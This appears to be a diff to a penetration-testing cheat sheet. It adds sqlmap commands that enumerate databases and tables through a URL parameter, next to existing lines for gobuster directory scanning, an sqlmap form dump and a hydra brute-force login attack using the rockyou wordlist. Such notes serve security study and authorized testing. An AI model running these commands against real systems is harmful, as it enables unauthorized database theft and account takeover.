@@ -38,6 +38,10 @@ $gobuster -u http://example.com -x php,html,js,txt -w /usr/share/dirb/wordlists/
 
 $sqlmap -u http://Target_IP/login.php --forms --dump
 
+$sqlmap -u http://Target_IP/listproducts.php?cat=1 –-dbs
+
+$sqlmap -u  http://Target_IP/listproducts.php?cat=1 –-dbs -D products –-tables
+
 # 4° Brute Force
 
 $hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
